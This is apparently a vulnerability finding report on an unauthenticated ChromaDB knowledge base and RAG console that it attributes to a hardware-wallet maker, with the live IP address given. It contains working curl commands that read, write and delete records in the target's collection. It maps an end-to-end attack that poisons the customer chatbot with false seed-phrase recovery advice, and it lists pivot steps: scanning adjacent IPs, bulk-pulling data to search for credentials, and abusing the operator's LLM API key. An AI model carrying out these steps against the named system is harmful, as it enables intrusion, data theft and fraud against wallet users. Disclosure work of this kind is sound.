# Keystone Hardware Wallet -- Unauth RWD on ChromaDB AI Knowledge Base

**Date:** 2026-06-20
**Tool:** chromascan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

| Field | Value |
|-------|-------|
| IP | 43.153.169.169 |
| Port 8000 | ChromaDB 1.0.0 -- unauth RWD |
| Port 5050 | RAG test console -- unauth LLM pipeline |
| Port 8080 | ChromaDB admin UI -- unauth, hardcoded to :8000 |
| API | v2 (multi-tenant) |
| Hosting | Tencent Cloud |
| Auth | NONE on all three ports |

---

## Operator Attribution

**Keystone** -- keyst.one -- hardware cryptocurrency wallet manufacturer

Evidence:
- Collection names `keystone_article_style` and `keystone_knowledge_base`
- Content explicitly references "Keystone" hardware wallet product line
- Source URLs in embedded metadata include `blog.keyst.one`
- Content covers Keystone-specific topics: private key custody, multisig wallets, blind signing, HNSW index configuration

---

## Data

**2 collections, 6,907 total records**

| Collection | ID | Records | Dimensions | Content |
|------------|----|---------|------------|---------|
| keystone_article_style | 001c74f8-135d-4455-9ce6-cc096755b649 | 752 | 1024 | Editorial/marketing content on crypto wallet security (Chinese + English) |
| keystone_knowledge_base | (separate UUID) | 6,155 | 1024 | Full product knowledge base: hardware wallet documentation, guides, comparisons |

**Sample -- keystone_article_style:**
- "希望你永远用不到，但若遇到，你已经准备好了。" (Hope you never need it, but if you do, you're ready.)
- "你的私钥，只应该存在于你手中的设备里。「Not your keys, not your coins」在 AI [era]..."
- "彻底攻克盲签问题，是多签钱包安全性的关键突破点" (Blind signing as multisig security breakthrough)

**Sample -- keystone_knowledge_base:**
- Hardware wallet comparison guides (2024)
- "In the rapidly evolving world of cryptocurrency, securing digital assets is of paramount importance"
- Source URLs referencing `blog.keyst.one`

---

## Additional Services -- Port 5050 (RAG Console)

Operator runs a Chinese-language internal RAG test console on port 5050: **"ChromaDB 客服测试台"** (Customer Service Test Platform).

**Exposed API endpoints (all unauthenticated):**

| Endpoint | Method | Function |
|----------|--------|----------|
| `/api/search` | POST | Semantic search + DeepSeek LLM response |
| `/api/collections` | GET | Lists collections and record counts |
| `/api/sources` | GET | Lists source documents |
| `/api/data` | GET | Raw data browser |
| `/api/doc/{id}` | GET | Document detail |
| `/api/generate-article-stream` | POST | Article generation via DeepSeek (streaming) |
| `/api/fact-check` | POST | Fact-checking via LLM |
| `/api/writing-history` | GET | All previously generated articles |

**LLM backend:** `deepseek-v4-flash` (short articles) / `deepseek-v4-pro` (long articles)

**Live LLM confirmed:** `/api/search` POST returns AI-generated customer support responses without authentication. Sample response to "how to recover wallet seed phrase" confirmed a Chinese-language answer sourced from the ChromaDB knowledge base, generated in real time via DeepSeek.

**Writing history exposed:** `/api/writing-history` returns all AI-generated articles including full text. Confirmed one article on Korean government seed phrase leak incident ($4.8M theft) -- indicates active production usage.

## Port 8080 -- ChromaDB Admin UI

React SPA (Vite build, title: "ChromaDB UI"). JS bundle contains hardcoded `http://43.153.169.169:8000` as the ChromaDB endpoint. Full collection management interface exposed without authentication.

---

## Access Matrix

| Operation | Port | Result | HTTP |
|-----------|------|--------|------|
| List tenants | 8000 | tenant list | GET /api/v2/tenants |
| List collections | 8000 | 2 collections | GET /api/v2/.../collections |
| Read records | 8000 | documents + embeddings | POST .../get |
| Write record | 8000 | 201 | POST .../add |
| Delete record | 8000 | {"deleted": 1} | POST .../delete |
| Semantic RAG query + AI answer | 5050 | Live DeepSeek response | POST /api/search |
| Writing history | 5050 | Full article history | GET /api/writing-history |
| Admin UI | 8080 | Full browse/manage | GET / |

**Canary UUID:** `nuclide-canary-2026`
**Target collection:** `keystone_article_style` (ID: 001c74f8-135d-4455-9ce6-cc096755b649)

Write confirmed: POST /add with 1024-dim zero vector + document returned HTTP 201.
Delete confirmed: POST /delete {"ids":["nuclide-canary-2026"]} returned {"deleted": 1}.
Verify confirmed: POST /get {"ids":["nuclide-canary-2026"]} returned {"ids": [], "documents": []} -- absent.

**Dimension note:** ChromaDB write requires explicit embedding vector. Operator uses 1024-dim embeddings. Zero vector accepted -- write access does not require the operator's embedding model.

---

## PoC

```bash
BASE="http://43.153.169.169:8000/api/v2/tenants/default_tenant/databases/default_database"
COLL="001c74f8-135d-4455-9ce6-cc096755b649"

# READ -- pull first 10 records from knowledge base
curl -s -X POST "$BASE/collections/$COLL/get" \
  -H "Content-Type: application/json" \
  -d '{"limit": 10, "include": ["documents", "metadatas"]}' | jq .

# WRITE -- inject canary record
curl -s -X POST "$BASE/collections/$COLL/add" \
  -H "Content-Type: application/json" \
  -d '{
    "ids": ["nuclide-canary-2026"],
    "embeddings": ['"$(python3 -c "print('[' + ','.join(['0.0']*1024) + ']')"')'],
    "documents": ["nuclide canary -- proof of write"],
    "metadatas": [{"source": "nuclide-research"}]
  }'

# DELETE -- remove canary
curl -s -X POST "$BASE/collections/$COLL/delete" \
  -H "Content-Type: application/json" \
  -d '{"ids": ["nuclide-canary-2026"]}' | jq .

# VERIFY -- confirm deletion
curl -s -X POST "$BASE/collections/$COLL/get" \
  -H "Content-Type: application/json" \
  -d '{"ids": ["nuclide-canary-2026"]}' | jq .ids
# Expected: []
```

---

## Impact

### Knowledge Base Exfiltration

The full Keystone product knowledge base (6,155 chunks) is readable without authentication. This is the backend for Keystone's AI chatbot or documentation assistant -- the complete internal corpus powering customer-facing AI responses.

### RAG Poisoning -- Financial Harm Vector

Write access to the knowledge base allows injection of false cryptocurrency security guidance. A poisoned record can cause the Keystone chatbot to return incorrect instructions for:
- Backup procedures (seed phrase handling)
- Private key management
- Recovery workflows
- Multisig setup

Keystone's users are protecting cryptocurrency assets. Misinformation about key custody has direct financial consequences -- assets lost, stolen, or locked out.

### Intellectual Property Exposure

`keystone_article_style` contains proprietary editorial framing for Keystone's security marketing content, including Chinese-language crypto security articles under development. Competitor-extractable.

### Blind Signing Content -- Phishing Surface

Content explicitly covers multisig wallet security and blind signing vulnerabilities. Poisoned guidance on these topics is high-value material for phishing campaigns targeting hardware wallet users.

### Live Poison Path -- End to End

The complete attack chain is confirmed and operational:

```
attacker POSTs to ChromaDB :8000/add (OPEN, no auth)
  -> poisoned record enters keystone_knowledge_base
    -> user queries Keystone chatbot (keyst.one)
      -> chatbot backend POSTs /api/search to :5050
        -> :5050 retrieves poisoned chunk from ChromaDB
          -> DeepSeek generates response citing poisoned context
            -> user receives false "official Keystone" wallet recovery guidance
              -> seed phrase compromised / funds stolen
```

All stages confirmed individually. No auth gate at any layer.

### DeepSeek API Key Abuse

`/api/generate-article-stream` and `/api/fact-check` call DeepSeek with the operator's server-side API key. These endpoints are unauthenticated. An attacker can trigger unbounded LLM inference against Keystone's account -- cost amplification and API quota exhaustion.

---

## Pivot Avenues

1. **keyst.one chatbot surface** -- identify the user-facing chatbot or docs assistant that routes through :5050/api/search; test whether poisoned KB content surfaces in production responses
2. **`/api/generate-article-stream`** -- stream an article generation request to confirm the DeepSeek key is live and measure quota exposure
3. **`/api/writing-history` full pull** -- complete article history reveals internal research topics, draft copy, and product roadmap signals
4. **Tencent Cloud 43.153.169.0/24** -- probe adjacent IPs for additional Keystone backend services
5. **keystone_knowledge_base full scroll** -- 6,155 records; pull with pagination for embedded credentials or internal API references in metadata fields (source, filepath, parent_id)
6. **Cross-tenant enumeration** -- GET /api/v2/tenants to confirm whether additional tenants beyond `default_tenant` exist

---

## Tool Reference

**chromascan** -- unauthenticated ChromaDB enumeration + canary write/delete verification
https://github.com/nuclide-research/chromascan
